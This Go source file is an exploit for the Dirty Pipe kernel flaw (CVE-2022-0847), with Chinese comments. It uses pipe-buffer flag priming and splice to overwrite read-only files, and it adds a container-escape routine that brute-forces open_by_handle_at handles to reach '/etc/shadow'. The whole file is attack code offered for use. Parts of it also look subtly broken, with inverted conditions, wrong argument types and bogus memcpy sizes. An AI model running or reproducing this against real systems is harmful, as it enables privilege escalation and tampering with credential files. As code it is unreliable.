package CVE_2022_0847

import (
	"C"
	"errors"
	"fmt"
	"golang.org/x/sys/unix"
	"log"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const PageSize = 4096

func initPipe() (*os.File, error) {
	r, w, err := os.Pipe()
	if err != nil {
		return nil, fmt.Errorf("pipe error: %w", err)
	}

	pipeSize, err := unix.FcntlInt(w.Fd(), syscall.F_GETPIPE_SZ, -1)
	if err != nil {
		return nil, fmt.Errorf("fcntl error: %w", err)
	}

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	buffer := [PageSize]byte{}
	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = w.Write(buffer[:]); err != nil {
			return nil, fmt.Errorf("pipe write error: %w", err)
		}
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = r.Read(buffer[:]); err != nil {
			return nil, fmt.Errorf("pipe read error: %w", err)
		}
	}

	return w, nil
	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

/**
 * 攻击者构造的 file_handle 结构体
 */
type myFileHandle struct {
	handleBytes uint32
	handleType  int
	fHandle     [8]uint8
}

/**
 * die 函数用于输出错误信息到 stderr，并以错误码结束程序，并不重要
 */
func die(msg string) {
	fmt.Errorf("Error: " + msg)
	os.Exit(1)
}

/**
 * 关键函数，用于爆破寻找指定文件的 file_handle 结构体
 * param bfd：'/.dockerinit' 文件描述符，与 '/etc/shadow' 在同一个文件系统中（已在 1.1.2 中说明）
 * param *path：爆破目标（本 case 中为 '/etc/shadow' 文件）
 * param *ih：爆破起始路径（本 case 中为 '/' 路径）的 file_handle 结构体
 * param *oh：返回参数，用于返回 '/etc/shadow' 的 file_handle 结构体
 */

func findHandle(bfd int, path string, ih *myFileHandle, oh *myFileHandle) int {
	var ino uint32 = 0
	var de int
	var dir syscall.Handle
	outh := myFileHandle{}
	outh.handleBytes = 8
	outh.handleType = 1

	// 拿到 '/' 在 path 中首次出现的位置
	path = path[strings.Index(path, "/"):]

	/**
	 * 递归寻找 path 的 file_handle 结构体
	 */
	if path != "" {
		// 递归的结束条件为，已经把 path 中的所有 '/' （即路径）处理完成
		C.memcpy(unsafe.Pointer(&oh.fHandle), unsafe.Pointer(&ih.fHandle), C.size_t(oh.fHandle))
		oh.handleType = 1
		oh.handleBytes = 8
		return 1
	}
	// 跳过本次 '/' 字符在 path 中的地址
	path = path[strings.Index(path, "/"):]

	fd, err := unix.OpenByHandleAt(bfd, ih, syscall.O_RDONLY)
	if err != nil {
		die("[-] open_by_handle_at")
	}

	// 第一次递归中，dir 变量被赋值为 '/' 路径
	if dir, err = syscall.Open(fd); err != nil {
		die("[-] fdopendir")
	}

	// 第一次递归中，为寻找 '/' 路径下，'/etc' 的 inodenumber，并将它复制给 ino
	for {
		de, err := syscall.ReadDirent(fd)
		if err != nil {
			break
		}
		if de == nil {
			break
		}
		var stat syscall.Stat_t
		if err := syscall.Stat(path, &stat); err != nil {
			panic(err)
		}
		ino = stat.Ino
		break
	}

	// 由于已经拿到 '/etc' 的 inodenumber，故可以暴力破解出 '/etc' 的 file_handle 结构体
	if de != 0 {
		for i := 0; i < 0xffffffff; i++ {
			outh.handleType = 1
			outh.handleBytes = 8
			C.memcpy(unsafe.Pointer(&outh.fHandle), unsafe.Pointer(&ino), C.size_t(ino))
			C.memcpy(unsafe.Pointer(uintptr(&outh.fHandle)+4), unsafe.Pointer(&i), C.size_t(i))

			if _, err := unix.OpenByHandleAt(bfd, ih, syscall.O_RDONLY); err != nil {
				die("[-] open_by_handle_at")
			} else {
				err := syscall.Close(fd)
				if err != nil {
					return 0
				}
				err = syscall.Close(dir)
				if err != nil {
					return 0
				}
				return findHandle(bfd, path, &outh, oh)
			}
		}
	}
	err = syscall.Close(fd)
	if err != nil {
		return 0
	}
	err = syscall.Close(dir)
	if err != nil {
		return 0
	}
	return 0
}

func initArgs() (*os.File, int64, string, error) {
	if len(os.Args) != 4 {
		log.Fatalf("Usage: %s TARGETFILE OFFSET DATA", os.Args[0])
	}

	filePath := os.Args[1]
	f, err := os.Open(filePath)
	if err != nil {
		return nil, 0, "", fmt.Errorf("open failed: %w", err)
	}

	offset, err := strconv.ParseInt(os.Args[2], 10, 64)
	if err != nil {
		return nil, 0, "", fmt.Errorf("parse int failed: %w", err)
	}

	if offset%PageSize == 0 {
		return nil, 0, "", errors.New("sorry, cannot start writing at a page boundary")
	}

	data := os.Args[3]
	nextPage := (offset | (PageSize - 1)) + 1
	endOffset := offset + int64(len(data))

	var fd1, fd2 *os.File
	var h myFileHandle

	// '/' 路径的 file_handle 结构体，`/` 的 inodenumber 一般为 2
	rootH := myFileHandle{}

	rootH.handleBytes = 8
	rootH.handleType = 1
	rootH.fHandle = [8]uint8{0x02, 0, 0, 0, 0, 0, 0, 0}

	// get a FS reference from something mounted in from outside
	fd1, err = os.OpenFile("/etc/hosts", os.O_RDONLY, 0666)
	if err != nil {
		die("[-] open")
	}

	if findHandle(int(fd1.Fd()), filePath, &rootH, &h) <= 0 {
		die("[-] Cannot find valid handle!")
	}

	fd2, err = unix.OpenByHandleAt(int(fd1.Fd()), &h, syscall.O_RDONLY)
	if err != nil {
		die("[-] open_by_handle")
	}

	buf := make([]byte, 4096)
	_, err = fd2.Read(buf)
	if err != nil {
		die("[-] read")
	}

	if endOffset > nextPage {
		return nil, 0, "", errors.New("sorry, cannot write across a page boundary")
	}

	fi, err := f.Stat()
	if err != nil {
		return nil, 0, "", fmt.Errorf("stat failed: %w", err)
	}

	if offset > fi.Size() {
		return nil, 0, "", errors.New("offset is not inside the file")
	}

	if endOffset > fi.Size() {
		return nil, 0, "", errors.New("sorry, cannot enlarge the file")
	}

	return f, offset, data, nil
}

func exploit(f, w *os.File, offset int64, data string) error {
	offset--
	n, err := syscall.Splice(int(f.Fd()), &offset, int(w.Fd()), nil, 1, 0)
	if err != nil {
		return fmt.Errorf("splice failed: %w", err)
	}
	if n == 0 {
		return errors.New("short splice")
	}

	nbytes, err := w.Write([]byte(data))
	if err != nil {
		return fmt.Errorf("write failed: %w", err)
	}

	if nbytes < len(data) {
		return errors.New("short write")
	}

	return nil
}

func main() {
	f, offset, data, err := initArgs()
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	w, err := initPipe()
	if err != nil {
		log.Fatal(err)
	}
	defer w.Close()

	if err = exploit(f, w, offset, data); err != nil {
		log.Fatal(err)
	}

	fmt.Printf("Overwrite %s successfully.\n", os.Args[1])
}
